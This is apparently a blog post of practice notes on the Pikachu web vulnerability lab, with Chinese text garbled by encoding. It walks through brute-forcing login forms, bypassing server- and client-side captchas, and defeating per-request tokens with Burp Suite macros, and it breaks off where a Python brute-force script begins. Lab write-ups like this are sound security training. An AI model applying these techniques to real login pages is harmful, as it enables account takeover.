<!--
	ä½œè€…ï¼šSariay
	æ—¶é—´ï¼š2018-08-26
	æè¿°ï¼šThere may be a bug, but don't worry, Qiling(å™¨çµ) says that it can work normally! aha!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head>
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      Webé¶åœº-Pikachu | Archeri&#39;s Blog
    
  </title>
  <meta name="author" content="Archeri Shade">
  <meta name="keywords" content="" />
  <meta name="description" content="" />
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">

  <!-- css -->
  
<link rel="stylesheet" href="/css/Annie.css">

  
  <!-- jquery -->
	
<script src="/plugin/jquery/jquery.min.js"></script>


<script>
    const CONFIG_BGIMAGE = {
      mode: 'random_you',
      normalSrc: '/img/header-bg.jpg',
      randomYouMax: 7,
      randomYouSrc: '/img/Random-img/',
	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
	  preloaderEnable: true
    }
	
    const CONFIG_LEACLOUD_COUNT = {
      enable: false,
	  appId: 'AU8...',
	  appKey: '4cU...',
	  serverURLs: 'http' || ' '
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="spinner">
					<div class="double-bounce1"></div>
					<div class="double-bounce2"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground bg-pan-br">
	<div class="mask">
		<!-- motto -->
		<div class="h-body">	
			
				<div class="motto text-shadow-pop-left">
					<p class="content" id="motto-content">è·å–ä¸­...</p>
					<p>-<p>
					<p class="author" id="motto-author">Just a minute...</p>
				</div>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more" class="scroll-down">
				<span class="icon-anchor1 animation-scroll-down"></span>
			</a>
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><span>0.0%</span></div>

	<div class="toc-switch"><span class="switch-button">ç›®å½•</span></div>

	<!-- Page title -->
	<p>
		
			ã€ŒWebé¶åœº-Pikachuã€
		
	</p>

	
	

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<span class="logo"> 
			<img src="/img/logo.png">
		</span>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	
	<div class="nav-body">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">ä¸»é¡µ</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">å½’æ¡£</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">åˆ†ç±»</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">æ ‡ç­¾</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">å…³äº</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">ç›¸å†Œ</a>
		</li>
		
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">æœç´¢</a>
		</li>
	
</ul>
	</div>
	
	<div class="nav-footer">
		<ul id="global-social">
	
		<li>
			<a href="https://github.com/ArcheriShade" target="_blank">
				<span class="icon-github"></span>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	æ—¶é—´ï¼š2018-11-17
	æè¿°ï¼š
		æ’ä»¶åç§°ï¼škatelog.min.js
		æ’ä»¶ä½œè€…ï¼šKELEN
		æ’ä»¶æ¥æº: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="æ–‡ç« ç›®å½•"></div>
			</div>
		</div>

		
<script src="/plugin/toc/katelog.min.js"></script>


		
	 

<div class="layout-post">
	<div id="layout-post">
		<div class="article-title">
			
	<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" itemprop="url">
		Webé¶åœº-Pikachu
	</a>

		</div>

		<div class="article-meta">
			<span>
				<i class="icon-calendar1"></i>
				
				




	æ›´æ–°äº

	<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" itemprop="url">
		<time datetime="2022-10-06T00:22:38.000Z" itemprop="dateUpdated">
	  		2022-10-06
	  </time>
	</a> 



			</span>
			<span>
				
	<i class="icon-price-tags"></i>
	
		<a href="/tags/Web/" class=" ">
			Web
		</a>
	
		<a href="/tags/Web%E9%9D%B6%E5%9C%BA/" class=" ">
			Webé¶åœº
		</a>
	
		<a href="/tags/Pikachu/" class=" ">
			Pikachu
		</a>
	
		
			</span>
			
			



		</div>

		<div class="article-content" id="article-content">
			<h1 id="NOTE-Pikachué¶åœºç»ƒä¹ ç¬”è®°"><a href="#NOTE-Pikachué¶åœºç»ƒä¹ ç¬”è®°" class="headerlink" title="[NOTE] Pikachué¶åœºç»ƒä¹ ç¬”è®°"></a>[NOTE] Pikachué¶åœºç»ƒä¹ ç¬”è®°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ˜¯é’ˆå¯¹Pikachué¶åœºçš„ç»ƒä¹ ç¬”è®°<br>æ˜¯åœ¨æå®ŒWebGoatä¹‹å<br>æƒ³ç€å†æ‰¾ä¸€ä¸ªé¶åœºç©ç©</p>
<p><strong>ç¯å¢ƒ</strong><br>æ”»å‡»è€…ï¼šKali Linux | 10.10.10.1<br>é¶æœºï¼šUbuntu | 10.10.10.2 | PHP 5.5.38+Apache 2.4.39+MySQL 8.0.16ï¼ˆå°çš®é¢æ¿ï¼‰</p>
<h2 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h2><blockquote>
<p>ä»æ¥æ²¡æœ‰å“ªä¸ªæ—¶ä»£çš„é»‘å®¢åƒä»Šå¤©ä¸€æ ·çƒ­è¡·äºçŒœè§£å¯†ç â€”â€”å¥¥æ–¯ç‰¹æ´›å¤«æ–¯åŸº</p>
</blockquote>
<h3 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h3><p>ç›´æ¥çˆ†ç ´å°±å®Œäº‹äº†</p>
<p>ä¸€ä¸ªå¯ç¤ºï¼š<br>æœ€å¥½èƒ½å¤Ÿæ ¹æ®ç½‘ç«™æœ¬èº«ï¼Œæ·»åŠ ä¸€äº›ç‰¹æ®Šå­—æ®µ<br>å¦‚ç½‘ç«™ååŠå…¶å˜å¼å•¥çš„ï¼Œä½œä¸ºpayloadä¹‹ä¸€<br>ï¼ˆpikachu&#x2F;pikachuï¼‰</p>
<h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h3><p>å‘ƒï¼Œå€’æ˜¯å¯ä»¥OCR</p>
<p>çœ‹çœ¼æç¤ºï¼š</p>
<blockquote>
<p>è¿™ä¸ªéªŒè¯ç å¥½åƒä¸€ç›´æœ‰æ•ˆå“ï¼</p>
</blockquote>
<p>çœ‹çœ‹ï¼Œå‘ç°åªè¦ç”¨æˆ·æ²¡æœ‰è¯·æ±‚æ–°çš„éªŒè¯ç ï¼Œä¸Šä¸€ä¸ªéªŒè¯ç å°±ä¼šä¸€ç›´æœ‰æ•ˆ<br>å› æ­¤å¯ä»¥ç›´æ¥çˆ†ç ´<strong>ï¼ˆå¯ç¤ºï¼šè¦æ³¨æ„éªŒè¯ç æ—¶æ•ˆæ€§ï¼‰</strong><br>å‰ææ˜¯å‘é€è¯·æ±‚çš„éªŒè¯ç è¦ä¸é¡µé¢æ˜¾ç¤ºçš„ä¸€è‡´ï¼ˆä¿è¯æ²¡æœ‰è¯·æ±‚æ–°çš„éªŒè¯ç ï¼‰</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023095720831.png" alt="image-20211023095720831"></p>
<hr>
<p>è§‚å¯Ÿä¸‹éªŒè¯ç çš„å…ƒç´ ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023100136110.png" alt="image-20211023100136110"></p>
<p>å‰ç«¯æ˜¯è¯·æ±‚æ—¶åŠ è½½ä¸€æ¬¡ï¼Œä¹‹ååªæœ‰åœ¨ç‚¹å‡»æ—¶æ‰é‡æ–°åˆ·æ–°<br>åˆ·æ–°çš„å‚æ•°å¥½åƒæ˜¯æ—¶é—´æˆ³ï¼Œä½†æ˜¯ä¼ å…¥å›ºå®šçš„ä¸€ä¸ªæ—¶é—´æˆ³ä¹Ÿä¼šåˆ·å‡ºä¸åŒçš„éªŒè¯ç </p>
<h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h3><p>éªŒè¯ç æ˜æ–‡å°åœ¨é¡µé¢ä¸Šï¼Ÿï¼Ÿï¼Ÿ</p>
<p>å“¦æ²¡äº‹äº†ï¼ŒéªŒè¯ç åªæ˜¯å‰ç«¯éªŒè¯<br>éªŒè¯ç é€šè¿‡åçš„åŒ…ç›´æ¥æŠ“ä¸Šæ¥é‡æ”¾å°±å®Œäº‹äº†</p>
<p>æ¯”ä¸Šé¢é‚£é¢˜è¿˜ç¦»è°±</p>
<h3 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="headerlink" title="tokené˜²çˆ†ç ´"></a>tokené˜²çˆ†ç ´</h3><p>è¡¨å•å¤šäº†ä¸ªéšè—fieldï¼š<br><code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;526966173722ea46a5804573073&quot;&gt;</code><br>è™½ç„¶æ˜¯tokenï¼Œä½†æ˜¯ç›´æ¥å†™åœ¨HTMLä¸Šäº†</p>
<p>çˆ†ç ´æ–¹å‘ï¼š</p>
<ul>
<li>Burp Suiteâ€”â€”å®šä¹‰å®æ“ä½œæ¯æ¬¡è¯·æ±‚æ›´æ–°token</li>
<li>è‡ªå†™è„šæœ¬</li>
</ul>
<h4 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h4><p>å…ˆå†™ä¸‹ä½¿ç”¨Burp Suiteçš„æ–¹æ³•<br>&#x3D;&#x3D;æ—¥åè€ƒè™‘å°†è¿™é‡Œæ¬å»â€œBurp Suiteè¿›é˜¶ä½¿ç”¨â€ä¹‹ç±»çš„å­¦ä¹ ç¬”è®°&#x3D;&#x3D;</p>
<p>æœ‰ä¸¤ç§åšæ³•</p>
<h5 id="ç¬¬ä¸€ç§æ–¹æ³•"><a href="#ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³•"></a>ç¬¬ä¸€ç§æ–¹æ³•</h5><p>æ¥è‡ªäº<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/A3f-7sP7je5DKQK_XEACJA">è¿™é‡Œ</a></p>
<p>è®¾ç½®æ¨¡å¼ä¸ºâ€œPitchforkâ€ï¼ˆè‰å‰æ¨¡å¼ï¼‰ï¼Œè®¾å®šå¦‚ä¸‹å˜é‡ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023104429603.png" alt="image-20211023104429603"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·åä¸ä½œçˆ†ç ´</p>
<p>ä»å“åº”åŒ…ä¸­æŠ“å–tokençš„åŒ¹é…å€¼ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023104719195.png" alt="image-20211023104719195"></p>
<p>ç„¶åç¬¬äºŒä¸ªpayloadï¼Œé€‰æ‹©ç±»å‹ä¸ºâ€œRecursive grepâ€ï¼Œå†é€‰æ‹©åˆšæå–çš„tokenå˜é‡ï¼š</p>
<img src="image-20211023104856508.png" alt="image-20211023104856508" style="zoom:67%;" />

<p>ç„¶åæ³¨æ„çˆ†ç ´çº¿ç¨‹åªèƒ½è®¾ç½®ä¸º1ï¼Œå› ä¸ºè¦ä½¿ç”¨åˆ°æå–çš„tokenå€¼æ˜¯å•æ¬¡ä¼ é€’çš„ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023105005794.png" alt="image-20211023105005794"></p>
<p>ç”±äºæ²¡æœ‰å¯¹ç”¨æˆ·åå­—æ®µè¿›è¡Œçˆ†ç ´ï¼Œæ‰€ä»¥æœ€åçˆ†ç ´ç»“æœä»…é’ˆå¯¹adminï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023105341536.png" alt="image-20211023105341536"></p>
<p>å¦å¤–è¯•äº†è¯•Cluster bombå¯¹ä¸‰ä¸ªå˜é‡è¿›è¡Œçˆ†ç ´ï¼Œå‘ç°ä¸å¤ªå¥æ•ˆ<br>å‰é¢çš„è¯·æ±‚ä¸­ç”¨æˆ·åå’Œå¯†ç éƒ½æœ‰ï¼Œä½†æ˜¯tokené‚£å—æ˜¯ç©ºçš„</p>
<h5 id="ç¬¬äºŒç§æ–¹æ³•"><a href="#ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³•"></a>ç¬¬äºŒç§æ–¹æ³•</h5><p>æ¥è‡ªäº<a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/#L.strong.Burp.Suite..strong.">g0tmi1kçš„æ–‡ç« </a></p>
<p>é¦–å…ˆæ·»åŠ ä¼šè¯å¤„ç†è§„åˆ™ï¼ˆSession Handling Rulesï¼‰ï¼š<br><code>Project options/Options</code> -&gt; <code>Sessions</code> -&gt; <code>Session Handling Rules</code> -&gt; <code>Add</code></p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023111338072.png" alt="image-20211023111338072"></p>
<p>è¿™é‡Œå®šä¹‰çš„è§„åˆ™å¯ä»¥è®©Burp Suiteåœ¨æ¯æ¬¡ä½œå‡ºè¯·æ±‚å‰<br>éƒ½æ£€è§†ä¸‹æ˜¯å¦æœ‰å¯¹åº”çš„é€‚ç”¨è§„åˆ™<br><em>defined scope for particular tools, URLs or parameters</em></p>
<p>è¾“å…¥è§„åˆ™æè¿°ï¼Œå¹¶é€‰æ‹©è§„åˆ™è¡Œä¸ºä¸ºâ€œRun a macroâ€ï¼ˆæ‰§è¡Œå®ï¼Œå› ä¸ºè¦æ›¿æ¢tokenï¼‰ï¼š<br><code>Details</code> -&gt; <code>Rule Action</code> -&gt; <code>Add</code> -&gt; <code>Run a macro</code></p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023112033096.png" alt="image-20211023112033096"></p>
<p>è¿™ç§è§„åˆ™ä¼šé€šè¿‡è¿è¡Œå®æˆ–å‘é€ä¸€è¿ä¸²å®šä¹‰å¥½çš„è¯·æ±‚<br>å¹¶åŸºäºå®çš„è¿è¡Œç»“æœæˆ–è¯·æ±‚çš„è¿”å›ï¼Œè‡ªå®šä¹‰åœ°æ›´æ–°å‚æ•°æˆ–cookies</p>
<p>é€‰æ‹©æ–°å»ºä¸€ä¸ªå®ï¼š<br><code>Add</code></p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023114250132.png" alt="image-20211023114250132"></p>
<p>ç„¶åé€‰æ‹©æƒ³è¦è¿è¡Œå®çš„è¯·æ±‚åŒ…ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023114423441.png" alt="image-20211023114423441"></p>
<p>è¿™é‡Œå¯ä»¥è¿‡æ»¤å‡ºæƒ³è¦çš„è¯·æ±‚åŒ…<br>è¦æ³¨æ„çš„æ˜¯ï¼Œè®°å½•å®ä¼šè¦æ±‚ä½¿ç”¨æ­£åœ¨ä»£ç†çš„æµè§ˆå™¨ï¼Œå› æ­¤æ­¤æ—¶åº”è¯¥å…³é—­æ‹¦æˆª</p>
<p>ç„¶åè¿›ä¸€æ­¥ç¼–è¾‘è¿™ä¸ªå®ï¼š<br><code>Macro description</code>å¤„å¯ä»¥å¡«å…¥è¿™ä¸ªå®çš„è¯´æ˜ä¿¡æ¯<br>ç‚¹å‡»<code>Configure item</code>å¯ä»¥å¯¹æŸä¸€é€‰ä¸­çš„è¯·æ±‚åŒ…è¿›è¡Œå®æ“ä½œç¼–è¾‘</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023154719530.png" alt="image-20211023154719530"></p>
<p>å¯ä»¥å¯¹å®å¦‚ä½•æ“ä½œè¯¥è¯·æ±‚åŒ…çš„cookieå’Œå‚æ•°ç­‰è¿›è¡Œç¼–è¾‘<br>ç”±äºæˆ‘ä»¬éœ€è¦ä»æ¯æ¬¡å“åº”ä¸­è·å–token<br>å› æ­¤åº”è¯¥è‡ªå®šä¹‰ä¸€ä¸ªå“åº”å‚æ•°ï¼š<br><code>Custom parameter locations in response</code>-&gt;<code>Add</code></p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023155449328.png" alt="image-20211023155449328"></p>
<p>ä¹‹åå°±æ˜¯ä»è¯·æ±‚åŒ…çš„å“åº”ä¸­å®šä¹‰&#x2F;æå–æˆ‘ä»¬è¦çš„å‚æ•°çš„åŒ¹é…æ¨¡å¼&#x2F;åŒ¹é…ä½ç½®ï¼š<br><code>Parameter name</code>ä¸­å¡«å…¥è¿™ä¸ªå‚æ•°çš„å‚æ•°åï¼ˆä»»æ„å¡«ï¼Œå¯ä»¥æ˜¯â€œfishâ€<del>ï¼Œä¸å’Œè¦æ›¿æ¢çš„è¯·æ±‚å‚æ•°åŒ¹é…ï¼Ÿ</del>ï¼‰<br><del><strong>ã€æ³¨æ„ã€‘è¿™ä¸ªå‚æ•°ååº”å½“å’Œæˆ‘ä»¬æƒ³è¦æ›¿æ¢çš„è¯·æ±‚å‚æ•°åç›¸åŒï¼Œè¿™æ ·åç»­æ‰èƒ½æˆåŠŸåŒ¹é…ä¸Šè¦æ›¿æ¢&#x2F;æ“ä½œçš„è¯·æ±‚å‚æ•°</strong></del><br><code>Start after expression</code>&#x2F;<code>End at delimiter</code>ä¸­å¡«å…¥å‚æ•°å€¼çš„å·¦å³ç•Œé™ï¼Œå»ºè®®è‡ªå·±ä»å“åº”ä¸­æ‹–æ‹½é€‰ä¸­ï¼Œè¿™æ ·Burp Suiteä¼šè‡ªåŠ¨å¡«å…¥è¿™ä¸¤ä¸ªå­—æ®µ</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023155423351.png" alt="image-20211023155423351"></p>
<p>ä¹‹åä¸€è·¯<code>OK</code>ï¼Œå›åˆ°ä¼šè¯å¤„ç†è§„åˆ™çš„å®æ“ä½œå®šä¹‰å¤„</p>
<ul>
<li>è¿™æ ·æˆ‘ä»¬å°±å®šä¹‰äº†ä¸€ä¸ªä¼šè¯å¤„ç†è§„åˆ™</li>
<li>è¿™ä¸ªè§„åˆ™ä¼šæ‰§è¡Œä¸€ä¸ªå®æ“ä½œ</li>
<li>è¿™ä¸ªå®æ“ä½œä¼šå¯¹æˆ‘ä»¬é€‰å®šçš„è¯·æ±‚çš„å“åº”ä¸­æå–ä¸€ä¸ªtokenå€¼</li>
<li>å¹¶æŠŠè¿™ä¸ªå€¼å­˜åœ¨è‡ªå®šä¹‰åå­—çš„å‚æ•°ä¸­</li>
</ul>
<p>æœ€åå‹¾é€‰â€œå…è®¸URLä¸åŒ¹é…â€ï¼š<br>å‹¾é€‰<code>Tolerate URL mismatch when matching parameters (use for URL-agnostic CSRF tokens)</code></p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023161139363.png" alt="image-20211023161139363"></p>
<p>æœ€ä¸Šé¢é€‰ä¸­çš„æ˜¯æˆ‘ä»¬åˆšå®šä¹‰å¥½çš„å®æ“ä½œï¼Œä½œç”¨æ˜¯æå–tokençš„å€¼<br>&#x3D;&#x3D;ä¸‹é¢ä¸€ä¸ªç®­å¤´æŒ‡å‘ï¼Œ<del>æ‰æ˜¯åº”ç”¨æŠŠtokenå€¼æ›¿æ¢åˆ°æˆ‘ä»¬æ¯æ¬¡è¯·æ±‚çš„token</del>æ˜¯æŠŠæ‰€æœ‰å‚æ•°ï¼ˆå³usernameã€passwordã€tokenç”šè‡³åŠ ä¸Šsubmitï¼‰éƒ½ä½œæŒ‡å®šçš„æ“ä½œâ€”â€”æ›´æ–°&#x2F;æ›¿æ¢&#x3D;&#x3D;<br>å†ä¸‹é¢ä¸€ä¸ªç®­å¤´æŒ‡å‘ï¼Œåº”è¯¥æ˜¯èµ·æ›´æ–°cookieçš„ä½œç”¨</p>
<p>ä¹‹åé€‰æ‹©è¯¥è§„åˆ™çš„ç›‘è§†ç›®æ ‡ä»¥åŠä½¿ç”¨èŒƒå›´ï¼š<br><code>Scope</code>-&gt;<code>Tools Scope</code>-&gt;ä»…å‹¾é€‰<code>Intruder</code>ï¼ˆå› ä¸ºæˆ‘ä»¬åªåœ¨çˆ†ç ´é‡Œç”¨ï¼‰<br><code>URL Scope</code>-&gt;<code>Use suite scope [defined in Target tab]</code>ï¼ˆé€‰æ‹©ä½¿ç”¨Burp Suiteçš„ç›‘è§†çª—ï¼Œä½†ç†è®ºä¸Šä¹Ÿèƒ½<code>Use custom scope</code>ï¼ŒæŒ‡å®šåˆ°PikachuæŒ‡å®šçš„é¡µé¢å°±ğŸ†—ï¼‰</p>
<img src="image-20211023162436455.png" alt="image-20211023162436455" style="zoom:67%;" />

<p>ä¹‹åå°†ç›®æ ‡ç«™ç‚¹æ”¾åˆ°Burp Suiteçš„ç›‘è§†çª—é‡Œï¼ˆç”±äºä¸Šè¿°çš„é€‰æ‹©ï¼‰ï¼š<br><code>Target</code>-&gt;<code>Site map</code>-&gt;<code>&#123;ç›®æ ‡ç«™ç‚¹&#125;</code>-&gt;<code>Add to scope</code></p>
<img src="image-20211023163257589.png" alt="image-20211023163257589" style="zoom:67%;" />

<p>ä¹‹åå¯èƒ½ä¼šå¼¹å‡ºä¸€ä¸ªæç¤ºçª—ï¼Œæç¤ºè¯´ä»€ä¹ˆâ€œè¦ä¸è¦åœæ­¢è®°å½•ç›‘è§†çª—å£ä¹‹å¤–çš„ç«™ç‚¹çš„ä»£ç†è®°å½•â€ä¹‹ç±»çš„ï¼Œéšä¾¿é€‰</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023163408994.png" alt="image-20211023163408994"></p>
<p>è¿™æ ·ï¼ŒBurp Suiteçš„ç›‘è§†çª—å£å°±ä¼šå¤šå‡ºæˆ‘ä»¬çš„é¶æœºç«™ç‚¹ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023164427863.png" alt="image-20211023164427863"></p>
<p>ä¹‹åæ­£å¸¸æ‰§è¡Œçˆ†ç ´ï¼Œé›†æŸç‚¸å¼¹æ¨¡å¼ï¼Œçº¿ç¨‹æ­£å¸¸è®¾ç½®ï¼Œ<strong>æ³¨æ„tokenå‚æ•°ä¸è¦è®¾ç½®payload</strong>ï¼Œå› ä¸ºå®æ“ä½œä¼šè‡ªåŠ¨å®Œæˆæ›¿æ¢ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023164932884.png" alt="image-20211023164932884"></p>
<p>çˆ†ç ´æ­£å¸¸å®Œæˆï¼Œä¸”æ¯ä¸ªè¯·æ±‚çš„tokenå€¼éƒ½æ˜¯è¢«æ›¿æ¢çš„ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023165252707.png" alt="image-20211023165252707"></p>
<p>å› ä¸ºæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªä¼šè¯æ“ä½œè§„åˆ™ï¼Œä¼šå¯¹é€‰å®šç›‘è§†çª—å£å†…çš„æ¯ä¸ªç«™ç‚¹åœ¨æŒ‡å®šçš„æ“ä½œèŒƒå›´å†…è¿›è¡Œæ£€è§†ï¼Œè‹¥æœ‰åŒ¹é…çš„ç«™ç‚¹å’Œé€‚ç”¨èŒƒå›´ï¼Œåˆ™åº”ç”¨ä¸Šç›¸åº”çš„è§„åˆ™<br>è¿™é‡Œæˆ‘ä»¬çš„è§„åˆ™æ˜¯åœ¨çˆ†ç ´å¤„ç†ä¸­è¿è¡Œä¸€ä¸ªå®ï¼Œè¿™ä¸ªå®ä¼šåœ¨æ¯æ¬¡è¯·æ±‚å‰éƒ½æŠŠtokenå€¼æ›¿æ¢æˆè¯·æ±‚å“åº”ä¸­ç»™å‡ºçš„æ–°å€¼<br>è¿™æ ·Burp Suiteå°±å®Œæˆäº†è‡ªåŠ¨åŒ–æ›´æ–°tokenå¹¶è¿›è¡Œçˆ†ç ´çš„åŠŸèƒ½ï¼Œç»•è¿‡äº†ç«™ç‚¹å¯¹çˆ†ç ´æ”»å‡»çš„å¼±é˜²å¾¡ã€‚</p>
<p>&#x3D;&#x3D;å‰©ä¸‹çš„ç–‘é—®å°±æ˜¯ï¼Œè¿™ä¸ªå®æ“ä½œåˆ°åº•æ˜¯æ€ä¹ˆæŠŠæ¯æ¬¡æå–çš„tokenå€¼åŒ¹é…åˆ°æ¯æ¬¡è¯·æ±‚çš„tokenå‚æ•°ä¸Šå»çš„ï¼Ÿï¼Ÿå»ºè®®é¢å¤–è¿›é˜¶å­¦ä¹ Burp Suiteçš„é«˜é˜¶ç”¨æ³•&#x3D;&#x3D;</p>
<h5 id="ä¸¤ç§æ–¹æ³•æ¯”è¾ƒ"><a href="#ä¸¤ç§æ–¹æ³•æ¯”è¾ƒ" class="headerlink" title="ä¸¤ç§æ–¹æ³•æ¯”è¾ƒ"></a>ä¸¤ç§æ–¹æ³•æ¯”è¾ƒ</h5><p>ç¬¬ä¸€ç§å°±æ¯”è¾ƒç®€å•ï¼Œä½†ç¼ºç‚¹ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼š</p>
<ul>
<li>åªèƒ½é’ˆå¯¹æŸä¸€ç‰¹å®šç”¨æˆ·è¿›è¡Œå¯†ç çˆ†ç ´</li>
<li>çº¿ç¨‹åªèƒ½ä¸º1ï¼Œæ•ˆç‡ä½</li>
</ul>
<p>ç¬¬äºŒç§è™½ç„¶å¤æ‚äº†ç‚¹ï¼ˆææ‡‚äº†è¿‡ç¨‹ä¹Ÿå°±é‚£æ ·å§â€¦.å§ï¼‰ï¼Œä½†ä¼˜åŠ¿æ˜æ˜¾<br>å­¦ä¼šä¼šè¯å¤„ç†è§„åˆ™ã€ç›‘è§†çª—å’Œå®æ“ä½œç­‰å¥½å¤„å¤šå¤š</p>
<h4 id="è‡ªå†™è„šæœ¬"><a href="#è‡ªå†™è„šæœ¬" class="headerlink" title="è‡ªå†™è„šæœ¬"></a>è‡ªå†™è„šæœ¬</h4><p>æ²¡å•¥å¥½è¯´çš„ï¼Œæƒå½“ç»ƒç»ƒPythonã€requestsè¿˜æœ‰BS4<br>ç›´æ¥ä¸Šä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span 